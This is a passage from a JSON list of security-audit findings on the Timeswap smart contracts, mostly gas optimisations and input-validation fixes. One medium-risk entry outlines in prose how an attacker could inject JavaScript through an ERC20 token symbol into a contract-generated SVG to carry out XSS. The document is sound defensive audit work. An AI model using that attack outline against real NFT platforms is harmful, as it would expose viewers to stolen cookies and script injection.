than `temp % 10 == 0`.   Therefore, checking `flag == 0 `first can save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L162-L162  ```solidity if (temp % 10 == 0 && flag == 0) ```  ### Recommendation  Change to:  ```solidity     if (flag == 0 && temp % 10 == 0)  ```  Other instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L180-L180  ```solidity else if (value % 10 != 0 && flag == 0)  ```  "}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Adding unchecked directive can save gas"}, {"title": "`TimeswapPair.sol#mint()` Avoiding unnecessary code execution using checks can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/155", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  Move storage writes to inside the code block of `if (tokensOut.asset > 0) {...}` can avoid unnecessary code execution when this check doesn't pass and save gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L214-L218  ```solidity         pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ``` ### Recommendation  Change to:  ```solidity         if (tokensOut.asset > 0) {                 pool.state.reserves.asset -= tokensOut.asset;                 asset.safeTransfer(assetTo, tokensOut.asset);         }         if (tokensOut.collateral > 0) {                 pool.state.reserves.collateral -= tokensOut.collateral;                 collateral.safeTransfer(collateralTo, tokensOut.collateral);         } ```    "}, {"title": "`TimeswapPair.sol#mint()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L157-L169  ```solidity=157 if (pool.state.totalLiquidity == 0) {     uint256 liquidityTotal = MintMath.getLiquidityTotal(xIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } else {     uint256 liquidityTotal = MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } ```  ### Recommendation  Change to:  ```solidity=157 uint256 liquidityTotal = pool.state.totalLiquidity == 0 ?     MintMath.getLiquidityTotal(xIncrease) :     MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease); liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);  pool.state.totalLiquidity += liquidityTotal; pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; ```  1. Avoiding code duplication; 2. Using the ternary operator to make the code shorter.  "}, {"title": "Avoid unnecessary storage read can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/153", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Avoid unnecessary storage read can save gas"}, {"title": "Cache array length in for loops can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Cache array length in for loops can save gas"}, {"title": "no contract check in function createPair ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/145", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "no contract check in function createPair "}, {"title": "can reduce gas in function createPair by replacing interface with address", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "can reduce gas in function createPair by replacing interface with address"}, {"title": "Gas Optimization: Cache result of `BlockNumber.get()`", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/142", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-01-timeswap-findings", "body": "Gas Optimization: Cache result of `BlockNumber.get()`"}, {"title": "using storage instead of memory to declare struct variable inside the function", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact more expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L58  instead of caching state on memory. just read it directly from the storage.  State memory state = pools[maturity].state;  ## Tools Used self research on:  https://remix.ethereum.org/  ## Recommended Mitigation Steps State storage state = pools[maturity].state;  "}, {"title": "Open TODOs", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/138", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Open TODOs"}, {"title": "Missing input validation on array lengths (PayMath.sol)", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/137", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact  The function below fails to perform input validation on arrays to verify the lengths match.  A mismatch could lead to an exception or undefined behavior.  ## Proof of Concept  `ids`, `assetsIn` (copied into from `maxAssetsIn` on line 18) https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L15-L28  While `givenMaxAssetsIn` is an internal function if you trace the code back the parameters are passed in by an external function (`pay` or `payEthAsset` or `payEthCollateral`) with no array length validation.  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps  Add input validation to check that the length of all arrays match (`ids`, `maxAssetsIn`).  "}, {"title": "Use assignment not += in function mint (TimeswapPair.sol)", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/136", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Use assignment not += in function mint (TimeswapPair.sol)"}, {"title": "Typos", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/135", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Typos"}, {"title": "Outdated OpenZeppelin dependency", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/132", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-timeswap-findings", "body": "Outdated OpenZeppelin dependency"}, {"title": "XSS via SVG Construction contract", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/131", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  thank_you   # Vulnerability details  ## Impact SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.  The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.   These set of circumstances leads to XSS when the SVG is loaded on any website.   ## Proof of Concept 1. Hacker generates an ERC20 token with a symbol that contains malicious Javascript. 2. Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1. 3. When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol. 4. When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.   ## Tools Used N/A  ## Recommended Mitigation Steps Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.   As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.   "}, {"title": "Gas: Break out of loop to save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-01-timeswap-findings", "body": "Gas: Break out of loop to save gas"}, {"title": "messing with the dues ids for victim user ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/129", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "messing with the dues ids for victim user "}, {"title": "calculate a condition before the loop instead of calculating it in every iteration", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "calculate a condition before the loop instead of calculating it in every iteration"}, {"title": "subtract values in the if statement to avoid a useless operation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  OriDabush   # Vulnerability details  # TimeswapPair.sol - Gas Optimization Lines 289-290 can be transferred into the if statements to avoid subtract 0 from the variables.  ### code before: pool.state.reserves.asset -= tokensOut.asset;  pool.state.reserves.collateral -= tokensOut.collateral;  if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);  if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);  ### code after:  if (tokensOut.asset > 0) {     asset.safeTransfer(assetTo, tokensOut.asset);     pool.state.reserves.asset -= tokensOut.asset; }  if (tokensOut.collateral > 0) {     collateral.safeTransfer(collateralTo, tokensOut.collateral);     pool.state.reserves.collateral -= tokensOut.collateral; }     "}, {"title": "Gas: No need to initialize variables with default values", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "Gas: No need to initialize variables with default values"}, {"title": "frontrun Temporary Dos attack", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/119", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "frontrun Temporary Dos attack"}, {"title": "`safeSymbol()` can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/114", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.  The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  ## Proof of Concept  The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol  The `safeSymbol()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  "}, {"title": "`safeName()` can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/113", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.  The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:  https://kauri.io/#single/dai-token-guide-for-developers/#token-info  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  ## Proof of Concept  The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol  The `safeName()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  "}, {"title": "safeDecimals can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.  A similar issue was found in a previoud code4rena contest: https://github.com/code-423n4/2021-05-nftx-findings/issues/46  ## Proof of Concept  The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol  The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32` https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54  `safeDecimals()` is used in multiple functions such as - CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54) - Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34) - Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)  ## Recommended Mitigation Steps  Modify the `safeDecimals()` function to change >= 32 to == 32 like this `if (success && data.length == 32) return   abi.decode(data, (uint8));`  "}, {"title": "`burn()` doesn't call ERC721 `_burn()`", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/111", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "`burn()` doesn't call ERC721 `_burn()`"}, {"title": "Remove salt from createPair()", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/109", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Remove salt from createPair()"}, {"title": "Incorrect Q in comment", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/108", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Incorrect Q in comment"}, {"title": "Caching weth in timeswapMintCallback can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  In `TimeswapConvenience.sol` the `weth` state variable is read twice. It can just be immediately assigned locally so that the two `deposit` calls avoid reading the same variable from storage  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505) - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `weth` to `localWeth`  "}, {"title": "Caching pair in timeswapPayCallback can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/106", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  In `CollateralizedDebt.sol` the `pair` state variable is read twice. It can just be immediately assigned locally so that the `require` and the `collateralizedDebtCallback` do not read the same state variable twice  ## Proof of Concept  ```jsx function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {     require(msg.sender == address(pair), 'E401');      convenience.collateralizedDebtCallback(pair, maturity, assetIn, data); } ```  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `pair` to e.g `localPair`  "}, {"title": "Constructor Does Not Check for Zero Addresses for _factory and _weth", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Meta0xNull   # Vulnerability details  ## Impact A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62-L64  ## Tools Used Manual Review  ## Recommended Mitigation Steps requires Addresses is not zero.  require(_factory != address(0), \"Address Can't Be Zero\") require(_weth != address(0), \"Address Can't Be Zero\")  "}, {"title": "Less than 256 uints are not gas efficient", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Less than 256 uints are not gas efficient"}, {"title": "WETH9 example uses payable.transfer", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/98", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "WETH9 example uses payable.transfer"}, {"title": "TimeswapPair.pay doesn't check for non-existent debt owner", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/97", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Similarly, the system will fail with low-level message without giving a business reason, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  The owner variable is used by TimeswapPair.pay without validation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L357  Which will yield low-level fail on array access if an owner is zero or not present in the system:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L360   ## Recommended Mitigation Steps  Verify owner function argument to be non-zero by expanding existing check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L352  Then, require in line 358 that, for example, dues.length >= ids.length:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L358   "}, {"title": "Borrowing of the whole asset supply can yield a low-level division revert", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/96", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Borrowing of the whole asset supply can yield a low-level division revert"}, {"title": "WithdrawMath.getCollateral reads storage repetitively for the same state variables that don\u2019t change", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on state variables storage access.  ## Proof of Concept  getCollateral only reads state.reserves.asset, state.totalClaims.insurance and state.reserves.collateral up to 2 times each, and state.totalClaims.bond up to 4 times:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L26   ## Recommended Mitigation Steps  Save all four state variables to memory before running the logic.   "}, {"title": "TimeswapPair's burn miss current pool liquidity check", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  If there is no liquidity in the pool, burn operation will not make sense and be reverted on low level math of decreasing liquidity share. It will be more transparent and uniform to add a check for liquidity before the logic.   ## Proof of Concept  ` burn` doesn't check for liquidity of the pool:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L205   ## Recommended Mitigation Steps  There is a check in other relevant functions, it can be added in the very same form here: ` require(pool.state.totalLiquidity > 0, 'E206')`  Error description can be updated to include ` burn `:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/ErrorCodes.md#e206   "}, {"title": "Convenience contract fails to function if asset or collateral is an ERC20 token with fees", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/93", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "Convenience contract fails to function if asset or collateral is an ERC20 token with fees"}, {"title": "more efficient gas usage by removing && operator", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check. using additional require check can save more gas:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L151-L152 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L201-L202 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L234-L235 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L272-L273 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L309-L310 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L351  ## Tools Used https://remix.ethereum.org  ## Recommended Mitigation Steps example: require(liquidityTo != address(0), 'E201' ); require(dueTo != address(0), 'E201');   "}, {"title": "TimeswapConvenience params structure components are not validated before usage", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/88", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-timeswap-findings", "body": "TimeswapConvenience params structure components are not validated before usage"}]